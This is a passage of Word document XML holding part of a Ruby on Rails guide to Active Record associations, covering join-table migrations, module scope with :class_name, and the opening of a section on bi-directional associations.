          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="36AE9ED3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Assembly &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="640FE47C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :parts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50BD4F19" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09905B0F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02021449" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Part &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24D0F316" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_and_belongs_to_many :assemblies</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F0A602B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A3ED1E3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">These need to be backed up by a migration to create the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assemblies_parts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> table. This table should be created without a primary key:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7224"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="39ABDB67" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3706CDED" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>CreateAssemblyPartJoinTable &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B16DC7C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57153D4A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_table :assemblies_parts, :id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; false</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="64DD1B38" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.integer :assembly_id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="116A1D4C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.integer :part_id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EF299F1" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2C088845" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E60911D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="110CDE68" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We pass </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:id =&gt; false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create_table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> because that table does not represent a model. That’s required for the association to work properly. If you observe any strange behavior in a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association like mangled models IDs, or exceptions about conflicting IDs chances are you forgot that bit.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35BCE30B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.4 Controlling Association Scope</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A5EFDBB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>By default, associations look for objects only within the current module’s scope. This can be important when you declare Active Record models within a module. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5304"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="615141A6" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1938B585" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MyApplication</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2F9866D7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Business</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04AE1070" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24B9535C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       has_one :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74BFAC83" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="784A115A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C889BF6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2FD4065B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       belongs_to :supplier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7404B0AA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72FA6144" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A72631F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="05506FA6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will work fine, because both the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Supplier</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Account</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class are defined within the same scope. But the following will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> work, because </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Supplier</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Account</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are defined in different scopes:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5304"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="5A50CEE0" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="79D7EDD2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MyApplication</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BCB8C2B" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Business</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ACD49A0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="308E70A5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       has_one :account</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6384249C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F7D5720" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="66845A63" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7E8C7A27" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Billing</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E372379" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5458DC28" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       belongs_to :supplier</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7002C677" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3584BE90" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="408F738D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="691D3B5E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To associate a model with a model in a different namespace, you must specify the complete class name in your association declaration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8064"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="13D0E880" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="217B76BE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>MyApplication</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18871897" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Business</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11C709DD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Supplier &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BD20ED2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       has_one :account,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="648F5638" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "MyApplication::Billing::Account"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="69EB8A91" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C2FCFEB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="21482BC9" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="68C48772" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Billing</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="568D20EA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F349E8D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>       belongs_to :supplier,</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20B3767E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        :class_name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "MyApplication::Business::Supplier"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1FD58F93" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EF1BF09" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B3AA4CB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="50742794" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.5 Bi-directional Associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131F31A2" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>It’s normal for associations to work in two directions, requiring declaration on two different models:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4344"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="6787B49B" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2EBFD7AA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
